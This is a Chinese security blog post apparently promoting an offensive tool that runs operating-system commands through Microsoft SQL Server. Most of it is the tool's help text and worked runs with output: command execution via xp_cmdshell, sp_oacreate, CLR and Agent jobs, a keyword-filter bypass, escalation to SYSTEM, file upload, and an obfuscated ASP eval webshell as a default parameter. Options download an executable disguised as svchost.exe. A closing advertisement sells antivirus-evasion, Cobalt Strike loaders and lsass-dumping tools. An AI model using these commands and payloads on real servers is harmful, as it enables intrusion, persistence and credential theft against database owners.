#  工具推荐 | MSSQL多功能集合命令执行利用工具   
Mayter  星落安全团队   2025-05-07 16:00  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/spc4mP9cfo75FXwfFhKxbGU93Z4H0tgt4O9libYH9mKfZdHgvke0CeibvXDtNcdaqamRk3dEEcRQiaWbGiacZ2waVw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/WN0ZdfFXY80dA2Z4y8cq7zy2dicHmWOIib5sIn8xAxRIzJibo2fwVZ3aicVBM8RnAqRPH5Libr4f02Zs5YnMLBcREnA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
现在只对常读和星标的公众号才展示大图推送，建议大家能把  
**星落安全团队**  
“  
**设为星标**  
”，  
否则可能就看不到了啦  
！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/rlSBJ0flllkXnsUODwVWmlxAHuHu4dBuwIlu707ZfPdbNTYyibYzQHA0xn0p2hTbQAiba04SOnDiadxVExZ53nfog/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**工具介绍**  
  
一款针对Microsoft SQL Server的多功能安全测试工具，集成多种命令执行技术，支持：  
1. **传统命令执行方式**  
1. xp_cmdshell:命令执行与实时回显  
1. sp_oacreate:组件调用执行系统命令  
1. **高级利用技术**  
1. CLR程序集加载执行（自定义.NET程序集注入）  
  
1. 数据库文件操作（上传/下载/写入）  
  
1. SQL Agent Job操纵（持久化控制）  
  
1. **辅助功能**  
1. 多协议支持（TDS/TCP, Named Pipe）  
  
1. 流量混淆（支持SSL加密连接）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rlSBJ0flllk4P3rNcm6GkhmxzHYL3ia8s0yyjZoOHCwKsT7SBYvzNTUOBxSOU4EQMUNpQyJwdS9BHiaV3fqxmXZw/640?wx_fmt=png&from=appmsg "")  
  
工具参数  
```
NAME:
   Mssql Toolkit - mssql command tool
USAGE:
   mssql-command-tools_Windows_64.exe [global options] command [command options] [arguments...]
AUTHOR:
   Microsoft.com clr参考: https://github.com/uknowsec/SharpSQLTools/
COMMANDS:
   help, h  Shows a list of commands or help for one command
GLOBAL OPTIONS:
   --server value, --host value, -s value  The database server (default: "127.0.0.1")
   --user value, -u value                  The database user (default: "sa")
   --password value, -p value              The database password
   --database value, -d value              The database name (default: "msdb")
   --port value, -P value                  The database port (default: 1433)
   --option value                          -xcmd, -X powershell (default: "whoami")
   --query value, -q value, --sql value    SQL query (default: "select @@version")
   --cmd value, -c value, --exec value     Exec System Command | xp_cmdshell命令执行 (default: "whoami")
   --cmd1 value, --c1 value                Exec System Command | sp_oacreate无回显执行 (default: "whoami >C:\\whoami.log")
   --cmd2 value, --c2 value                Exec System Command | sp_oacreate有回显执行 | wscript.shell (default: "whoami")
   --cmdsp value                           Exec System Command | sp_oacreate有回显执行 | {72C24DD5-D70A-438B-8A42-98424B88AFB8} (default: "whoami")
   --cmd3 value, --c3 value                Exec System Command | clr执行 | clr命令参考: https://github.com/uknowsec/SharpSQLTools/ (default: "clr_exec whoami")
   --cmdpy value                           Exec System Command | clr执行 | clr命令参考: https://github.com/Ridter/PySQLTools (default: "clr_exec whoami")
   --cmd4 value, --c4 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
   --cmd5 value, --c5 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
   --cmd6 value, --c6 value                Exec System Command | xp_cmdshell命令执行|过滤了xp_cmdshell等关键字提交方法语句 (default: "-c6 whoami")
   --cmd7 value, --c7 value                Exec System Command | 自写clr执行 (default: "-c7 whoami")
   --cmd8 value, --c8 value                Exec System Command | r language command (default: "-c8 whoami")
   --cmd9 value, --c9 value                Exec System Command | python language command (default: "-c9 whoami")
   --cmd10 value, --c10 value              Exec System Command | createAndStartJob command (default: "-c10 whoami >c:\\windows\\temp\\123.txt")
   --cmd11 value, --c11 value              Exec System Command | 自写clr执行 | --option -x --cmd11 cmd | --option -X --cmd11 powershell (default: "--option -x --cmd11 cmd")
   --dir value, --dirtree value            xp_dirtree列目录 | dir c:
   --path value                            网站路径 -path + -code | c:\inetpub\wwwroot\cmd.asp (default: "c:\\inetpub\\wwwroot\\cmd.asp")
   --local value                           本地路径 localFile (default: "c:\\1.txt")
   --remote value                          远程路径 remoteFile (default: "C:\\Windows\\Temp\\1.txt")
   --code value                            -path + -code | 如果代码有"就加\来匹配<%eval request("cmd")%>网站路径和asp密码默认:LandGrey (default: "<%@codepage=65000%><%@codepage=65000%><%+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgApACk-%>")
   --downurl value                         下载文件的url地址 | http://www.microsoft.com/defender.exe
   --filepath value                        下载文件的路径 | c:\programdata\svchost.exe
   --debug                                 Debug info
   --enable, -e                            Enabled xp_cmdshell
   --disable, --diclose                    Disable xp_cmdshell
   --ole, --oleopen                        Enabled sp_oacreate
   --dole, --dolose                        Disable sp_oacreate
   --clr, --clropen                        Enabled clr enabled
   --dclr, --dclose                        Disable clr enabled
   --rlce, --rlceopen                      r|python languag eenabled
   --jobopen                               MSSQL Agent Job服务开启
   --install_clr, --in_clr                 install clr  | --cmd3 "clr_exec whoami" | clr命令参考: https://github.com/uknowsec/SharpSQLTools/
   --uninstall_clr, --un_clr               uninstall clr | --cmd3 "clr_exec whoami"
   --installpy_clr, --inpy_clr             installpy clr  | --cmdpy "clr_exec whoami" | clr命令参考: https://github.com/Ridter/PySQLTools
   --uninstallpy_clr, --unpy_clr           uninstallpy clr | --cmdpy "clr_exec whoami"
   --install_clrcmd, --in_clrcmd           install clrcmd | "--c4 net --c5 user"
   --uninstall_clrcmd, --un_clrcmd         uninstall clrcmd | "--c4 net --c5 user"
   --install_clrcmd1, --in_clrcmd1         install clrcmd1 | --cmd7 "whoami"
   --uninstall_clrcmd1, --un_clrcmd1       uninstall clrcmd | --cmd7 "whoami"
   --install_clrcmd2, --in_clrcmd2         install clrcmd2 | --cmd11 "whoami"
   --uninstall_clrcmd2, --un_clrcmd2       uninstall clrcmd2 | --cmd11 "whoami"
   --upload                                --upload --local c:\svchost.exe --remote C:\Windows\Temp\svchost.exe
   --help, -h                              show help
```  
  
帮助信息  
```
开启xp_cmdshell组件
mssql-command-tools_Windows_64.exe -s 127.0.0.1 -u sa -p admin --enable/--e
开启sp_oacreate组件
mssql-command-tools_Windows_64.exe -s 127.0.0.1 -u sa -p admin --ole/--o
开启ole组件
mssql-command-tools_Windows_64.exe -s 127.0.0.1 -u sa -p admin -clr
xp_cmdshell 执行
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd "whoami"
nt service\mssqlserver
绕过过滤xp_cmdshell关键字
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd6 "whoami"
nt service\mssqlserver
sp_oacreate 执行 略微不一样，但大致一样
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd2 "whoami" 
nt service\mssqlserver
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmdsp "whoami" 
nt service\mssqlserver
安装SharpSQLTools clr
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --install_clr
Clrcmd Install SharpSQLTools CLR Success.
执行命令
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd3 "clr_exec whoami"
mssql: [+] Process: cmd.exe
mssql: [+] arguments:  /c whoami
mssql: [+] RunCommand: cmd.exe  /c whoami
mssql:
mssql: nt service\mssqlserver
提权
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd3 "clr_badpotato whoami" 
mssql: [*] CreateNamedPipeW Success! IntPtr:4048
mssql: [*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:1816351484896
mssql: [*] ConnectNamePipe Success!
mssql: [*] CurrentUserName : MSSQLSERVER
mssql: [*] CurrentConnectPipeUserName : SYSTEM
mssql: [*] ImpersonateNamedPipeClient Success!
mssql: [*] OpenThreadToken Success! IntPtr:6840
mssql: [*] DuplicateTokenEx Success! IntPtr:6556
mssql: [*] SetThreadToken Success!
mssql: [*] CreateOutReadPipe Success! out_read:5536 out_write:5528
mssql: [*] CreateErrReadPipe Success! err_read:3436 err_write:5072
mssql: [*] CreateProcessWithTokenW Success! ProcessPid:9608
mssql: nt authority\system
卸载SharpSQLTools clr
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --uninstall_clr
Uninstall SharpSQLTools CLR Success.
安装PySQLTools clr
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --installpy_clr
Clrcmd Install PySQLTools Clr Success.
执行命令
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmdpy "clr_exec whoami" 
mssql: [+] Successfully unhooked ETW!
mssql: [*] No dll to patch
mssql: [+] Process: cmd.exe
mssql: [+] arguments:  /c whoami
mssql: [+] RunCommand: cmd.exe  /c whoami
mssql:
mssql: nt service\mssqlserver
提权
卸载PySQLTools clr
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --uninstallpy_clr
Uninstall PySQLTools Clr Success.
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd4 net -cmd5 user
\\ 的用户帐户
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
命令运行完毕，但发生一个或多个错误。
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd7 "whoami"   
mssql: Command is running, please wait.
mssql: nt service\mssqlserver
mssql: nt service\mssqlserver
r language command (default: "-c8 whoami")
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd8 "whoami" 
nt service\mssqllaunchpad
python language command (default: "-c9 whoami")
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd9 "whoami"
nt service\mssqllaunchpad
执行CreateAndStartJob
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd10 "whoami >c:\\programdata\\test.txt"
CreateAndStartJob Command Success!
当权限不足的时候
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd3 "clr_efspotato net start SQLSERVERAGENT"
列目录
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -dir "c:\\programdata"
subdirectory    depth   file
123.dll
Application Data
Documents
Huorong
Microsoft
MSSQLSERVER
Package Cache
regid.1991-06.com.microsoft
SoftwareDistribution
SSISTelemetry
Templates
test.txt
USOPrivate
USOShared
VMware
「开始」菜单
桌面
Command List Dir Success.
-x cmd命令
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -option -x --cmd11 "whoami"
[]
nt service\mssqlserver
-X powershell命令
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -option -X --cmd11 "Get-Process explorer"
[]
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   2296     113    71352     183772              1304   1 explorer
上传文件
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --upload --local c:\Database.dll --remote C:\programdata\Database.dll 
[*] Uploading 'c:\Database.dll' to 'C:\programdata\Database.dll'...
[!] C:\programdata\Database.dll Upload Success
mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -dir "c:\\programdata"
subdirectory    depth   file
123.dll
Application Data
Database.dll
```  
  
参考项目  
```
https://github.com/Ridter/PySQLTools
https://github.com/uknowsec/SharpSQLTools
https://github.com/Ridter/MSSQL_CLR
https://github.com/JKme/cube/blob/master/core/sqlcmdmodule/mssql3.go
https://quan9i.top/post/SQL%20Server%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/
```  
  
  
**相关地址**  
  
**关注微信公众号后台回复“入群”，即可进入星落安全交流群！**  
  
**关注微信公众号后台回复“20250508”，即可获取项目下载地址！**  
  
****  
  
****  
**圈子介绍**  
  
博主介绍  
：  
  
  
目前工作在某安全公司攻防实验室，一线攻击队选手。自2022-2024年总计参加过30+次省/市级攻防演练，擅长工具开发、免杀、代码审计、信息收集、内网渗透等安全技术。  
  
  
目前已经更新的免杀内容：  
- 部分免杀项目源代码  
  
- 一键击溃360+核晶  
  
- 一键击溃windows defender  
  
- 一键击溃火绒进程  
  
- CobaltStrike4.9.1二开   
  
- CobaltStrike免杀加载器  
  
- 数据库直连工具免杀版  
  
- aspx文件自动上线cobaltbrike  
  
- jsp文件  
自动上线cobaltbrike  
  
- 哥斯拉免杀工具   
XlByPassGodzilla  
  
- 冰蝎免杀工具 XlByPassBehinder  
  
- 冰蝎星落专版 xlbehinder  
  
- 正向代理工具 xleoreg  
  
- 反向代理工具xlfrc  
  
- 内网扫描工具 xlscan  
  
- CS免杀加载器 xlbpcs  
  
- Todesk/向日葵密码读取工具  
  
- 导出lsass内存工具 xlrls  
  
- 绕过WAF免杀工具 ByPassWAF  
  
- 等等...  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/DWntM1sE7icZvkNdicBYEs6uicWp0yXACpt25KZIiciaY7ceKVwuzibYLSoup8ib3Aghm4KviaLyknWsYwTHv3euItxyCQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
目前星球已满500人，价格由208元  
调整为  
218元(  
交个朋友啦  
)，600名以后涨价至268元！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/rlSBJ0flllkN0Z3pNGXR2znpzfM0z8rR6nUPo8lbItfge0zwVQpsQpBNMby3aslX4WWKgTgyvaPvYc3wf2AMBQ/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/MuoJjD4x9x3siaaGcOb598S56dSGAkNBwpF7IKjfj1vFmfagbF6iaiceKY4RGibdwBzJyeLS59NlowRF39EPwSCbeQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
往期推荐  
  
  
1.[学不会全额退款 | 星落免杀第一期，助你打造专属免杀武器库](https://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247494072&idx=1&sn=e46a6d176a8fad2aa4b4c055de3607da&scene=21#wechat_redirect)  
  
  
  
[2.](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247488563&idx=1&sn=1f358db06abaf7a4036129d33682dfcc&chksm=c0e2bf8cf795369ac5f5869225cd00ab4aee59e14549692a8711955c0c2f334f1651aa78e64c&scene=21#wechat_redirect)  
[【干货】你不得不学习的内网渗透手法](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247489483&idx=1&sn=0cbeb449e56db1ae48abfb924ffd0b43&chksm=c0e2bc74f79535622f39166c8ed17d5fe5a2bbc3f622d20491033b6aa61d26d789e59bab5b79&scene=21#wechat_redirect)  
  
  
  
3[.](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247485412&idx=1&sn=43f7ccd9e5da3e293faac9def1f07458&chksm=c0e2ac5bf795254df7a82a677fc5792c62829442adc24239fdb6208ec36e8450e81c617bde70&scene=21#wechat_redirect)  
[【免杀】CobaltStrike4.9.1二开 | 自破解 免杀 修复BUG](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247488486&idx=1&sn=683083d38a58de4a95750673d9cb725d&chksm=c0e2b859f795314f3b7bc980a5d4114508ee2c286bc683cdfd25eefa4fb59f26adfe5483690b&scene=21#wechat_redirect)  
[！](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247486966&idx=1&sn=3f144d5936d5cdc11178004549384ace&chksm=c0e2a649f7952f5f7557dde6e9cca53ecee7b5e2f7ff23395250e8fe47acb102902d9727185d&scene=21#wechat_redirect)  
  
  
  
4. [【免杀】原来SQL注入也可以绕过杀软执行shellcode上线CoblatStrike](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247489950&idx=1&sn=a54e05e31a2970950ad47800606c80ff&chksm=c0e2b221f7953b37b5d7b1a8e259a440c1ee7127d535b2c24a5c6c2f2e773ac2a4df43a55696&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/DWntM1sE7icZvkNdicBYEs6uicWp0yXACpt25KZIiciaY7ceKVwuzibYLSoup8ib3Aghm4KviaLyknWsYwTHv3euItxyCQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
【  
声明  
】本文所涉及的技术、思路和工具仅用于安全测试和防御研究，切勿将其用于非法入侵或攻击他人系统以及盈利等目的，一切后果由操作者自行承担！！！  
  
